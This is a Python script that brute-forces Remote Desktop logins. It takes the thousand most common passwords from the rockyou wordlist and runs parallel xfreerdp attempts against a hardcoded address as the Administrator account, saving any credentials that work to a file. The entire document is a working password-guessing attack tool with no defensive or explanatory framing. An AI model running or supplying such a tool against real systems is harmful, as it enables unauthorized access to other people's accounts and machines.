import subprocess
from multiprocessing import Pool, Manager, cpu_count
from collections import Counter
import time

# Configuration
target_ip = "192.168.137.128"
username = "Administrator"
rockyou_path = "/usr/share/wordlists/rockyou.txt"
top_n = 1000
success_log = "rdp_success.txt"

# Extract Top Passwords
def get_top_passwords(filepath, top_n):
    with open(filepath, "r", encoding="latin-1", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]
    counter = Counter(passwords)
    return [pw for pw, _ in counter.most_common(top_n)]

# Worker function
def attempt_login(password, found_flag):
    if found_flag.value:
        return None

    command = [
        "xfreerdp",
        f"/u:{username}",
        f"/p:{password}",
        f"/v:{target_ip}",
        "/cert:ignore",
        "/log-level:OFF"
    ]
    try:
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=6)
        if b"connected" in result.stdout.lower():
            found_flag.value = True
            print(f"[+] SUCCESS: {username}:{password}")
            with open(success_log, "w") as f:
                f.write(f"{username}:{password}\n")
            return password
    except:
        pass
    return None

# Main Controller
if __name__ == "__main__":
    print(f"[*] Extracting top {top_n} passwords...")
    passwords = get_top_passwords(rockyou_path, top_n)

    manager = Manager()
    found_flag = manager.Value('b', False)

    print(f"[*] Starting brute-force...")
    pool = Pool(cpu_count() * 2)
    jobs = []

    try:
        for pw in passwords:
            if found_flag.value:
                break
            job = pool.apply_async(attempt_login, args=(pw, found_flag))
            jobs.append(job)

        for job in jobs:
            if found_flag.value:
                break
            result = job.get()
            if result:
                print(f"[+] Cracked: {result}")
                break

    except KeyboardInterrupt:
        print("\n[!] Interrupted. Terminating...")
    finally:
        pool.terminate()
        pool.join()

    if not found_flag.value:
        print("[-] Password not found.")